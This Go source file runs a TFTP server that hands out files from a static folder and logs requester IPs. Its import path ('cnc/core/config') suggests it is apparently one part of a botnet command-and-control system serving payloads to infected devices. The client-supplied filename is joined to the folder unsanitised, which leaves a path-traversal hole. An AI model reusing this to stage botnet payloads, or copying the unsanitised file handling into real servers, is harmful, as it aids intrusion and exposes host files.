package tftp

import (
	"cnc/core/config"
	"errors"
	"fmt"
	"io"
	"log"
	"os"
	"path/filepath"

	"github.com/pin/tftp"
)

var (
	staticDir = "assets/static/"
)

func Serve() {
	server := tftp.NewServer(func(filename string, rf io.ReaderFrom) error {
		raddr := rf.(tftp.OutgoingTransfer).RemoteAddr()

		file, err := os.Open(filepath.Join(staticDir, filename))
		if err != nil {
			return errors.New("file not found")
		}

		defer file.Close()

		_, err = rf.ReadFrom(file)
		if err != nil {
			return err
		}

		log.Printf("[tftp] %s requested %s\n", raddr.IP.String(), filename)

		return nil
	}, nil)

	err := server.ListenAndServe(fmt.Sprintf(":%d", config.Config.WebServer.Ftp))
	if err != nil {
		return
	}
}
